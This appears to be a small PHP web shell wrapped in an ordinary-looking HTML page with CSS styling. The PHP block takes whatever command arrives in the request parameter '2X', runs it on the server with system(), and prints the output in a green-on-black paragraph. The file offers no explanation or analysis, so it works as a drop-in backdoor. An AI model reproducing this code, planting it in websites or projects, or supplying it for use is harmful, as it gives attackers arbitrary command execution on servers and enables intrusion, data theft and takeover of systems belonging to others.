<head>
<style>
    p {text-align:center;
        color:green;
        background-color:black;
        font-size: 20;}
    body {background-color:gray}
</style>
</head>
<body>
<?php
if(isset($_REQUEST['2X'])){
    $command = $_REQUEST['2X'];
    echo "<p>";
    system($command);
    echo "</p>";
    die;
}
?>
</body>
